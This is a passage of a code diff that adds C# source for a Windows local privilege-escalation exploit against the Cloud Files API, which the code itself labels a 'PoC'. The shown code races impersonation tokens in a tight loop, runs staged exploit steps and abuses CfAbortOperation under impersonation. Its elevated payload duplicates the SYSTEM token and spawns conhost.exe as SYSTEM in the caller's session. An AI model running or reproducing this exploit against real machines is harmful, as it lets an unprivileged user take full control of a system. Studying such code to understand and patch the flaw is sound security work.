+                        if (status == NtStatus.STATUS_NOTIFY_ENUM_DIR)
+                        {
+                            Logger.Info("Registry change detected - terminating process");
+                            Environment.Exit(0);
+                            break;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Registry monitoring thread failed", ex);
+            }
+        }
+
+        private static void ForceTokenThread(object threadParam)
+        {
+            try
+            {
+                using (var thread = (NtThread)threadParam)
+                {
+                    Logger.Debug($"Token forcing thread started for thread: {thread}");
+
+                    using (var token = TokenUtils.GetAnonymousToken())
+                    {
+                        while (true)
+                        {
+                            thread.SetImpersonationToken(token);
+                            thread.SetImpersonationToken(null);
+                        }
+                    }
+                }
+            }
+            catch (ThreadAbortException)
+            {
+                Logger.Debug("Token forcing thread aborted");
+                return;
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Token forcing thread failed", ex);
+            }
+        }
+
+        #endregion
+    }
+
+    #endregion
+
+    #region Main Program
+
+    static class Program
+    {
+        static void Main(string[] args)
+        {
+            Logger.Info("=== Windows Privilege Escalation PoC Started ===");
+            Logger.Info($"Process ID: {Process.GetCurrentProcess().Id}");
+
+            try
+            {
+                // Check if running as SYSTEM
+                bool isSystem = CheckIfRunningAsSystem();
+
+                if (isSystem)
+                {
+                    Logger.Info("Running as SYSTEM - executing elevated payload");
+                    ExecuteElevatedPayload();
+                    return;
+                }
+
+                // Verify Cloud Files API is available
+                VerifyCloudFilesApi();
+
+                // Parse command line arguments
+                if (args.Length <= 1)
+                {
+                    int stage = args.Length > 0 ? int.Parse(args[0]) : 0;
+                    ExecuteExploitStage(stage);
+                }
+                else
+                {
+                    // Alternative execution mode with credentials
+                    ExecuteWithCredentials(args[0], args[1]);
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Critical("Fatal error in main execution", ex);
+                Environment.Exit(1);
+            }
+
+            Logger.Info("=== Execution completed ===");
+        }
+
+        private static bool CheckIfRunningAsSystem()
+        {
+            try
+            {
+                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
+                {
+                    bool isSystem = identity.IsSystem;
+                    Logger.Info($"Current identity: {identity.Name} (IsSystem: {isSystem})");
+                    return isSystem;
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to check current identity", ex);
+                throw;
+            }
+        }
+
+        private static void VerifyCloudFilesApi()
+        {
+            try
+            {
+                Logger.Debug("Verifying Cloud Files API availability");
+                NativeInterop.CfGetPlatformInfo(out NativeInterop.CF_PLATFORM_INFO platformInfo).CheckHResult();
+                Logger.Info($"Cloud Files API available - Build: {platformInfo.BuildNumber}");
+            }
+            catch (Exception ex)
+            {
+                Logger.Critical("Cloud Files API not available", ex);
+                throw;
+            }
+        }
+
+        private static void ExecuteExploitStage(int stage)
+        {
+            Logger.Info($"Executing exploit stage: {stage}");
+
+            if (stage < 0 || stage >= ExploitConfig.TOTAL_STAGES)
+            {
+                throw new ArgumentException($"Invalid stage number: {stage}. Must be 0-{ExploitConfig.TOTAL_STAGES - 1}");
+            }
+
+            var stateMachine = new ExploitStateMachine();
+            stateMachine.ExecuteStage(stage);
+        }
+
+        private static void ExecuteWithCredentials(string username, string password)
+        {
+            Logger.Info($"Executing with credentials for user: {username}");
+
+            try
+            {
+                using (var token = TokenUtils.GetLogonUserToken(username, "", password, SecurityLogonType.Network, null))
+                {
+                    using (var impersonation = token.Impersonate())
+                    {
+                        Logger.Info("Impersonation successful - calling CfAbortOperation");
+                        NativeInterop.CfAbortOperation(
+                            NtProcess.Current.ProcessId,
+                            IntPtr.Zero,
+                            NativeInterop.AbortHydrationFlags.Block
+                        ).CheckHResult();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to execute with credentials", ex);
+                throw;
+            }
+        }
+
+        private static void ExecuteElevatedPayload()
+        {
+            try
+            {
+                // Restore original windir environment variable
+                Environment.SetEnvironmentVariable("windir", ExploitConfig.WINDOWS_DIR, EnvironmentVariableTarget.Process);
+                Logger.Info("Restored windir environment variable");
+
+                // Connect to named pipe
+                Logger.Info($"Connecting to named pipe: {ExploitConfig.PIPE_NAME}");
+                using (var pipeClient = new NamedPipeClientStream(ExploitConfig.PIPE_NAME))
+                {
+                    pipeClient.Connect();
+
+                    // Get session ID from pipe server
+                    IntPtr pipeHandle = pipeClient.SafePipeHandle.DangerousGetHandle();
+                    if (!NativeInterop.GetNamedPipeServerSessionId(pipeHandle, out uint sessionId))
+                    {
+                        Logger.Error("Failed to get named pipe server session ID");
+                        return;
+                    }
+
+                    Logger.Info($"Retrieved session ID: {sessionId}");
+                    pipeClient.Dispose();
+
+                    // Duplicate and modify token
+                    using (var token = NtToken.OpenEffectiveToken())
+                    using (var duplicatedToken = token.DuplicateToken())
+                    {
+                        duplicatedToken.SetSessionId((int)sessionId);
+                        Logger.Info($"Token session ID set to: {sessionId}");
+
+                        // Launch elevated process
+                        Logger.Info($"Launching elevated conhost.exe");
+                        Win32Process.CreateProcessAsUser(
+                            duplicatedToken,
+                            ExploitConfig.CONHOST_PATH,
+                            "",
+                            CreateProcessFlags.None,
+                            null
+                        );
+
+                        Logger.Info("Elevated process launched successfully");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Critical("Failed to execute elevated payload", ex);
+                throw;
+            }
+        }
+    }
+
+    #endregion
 }
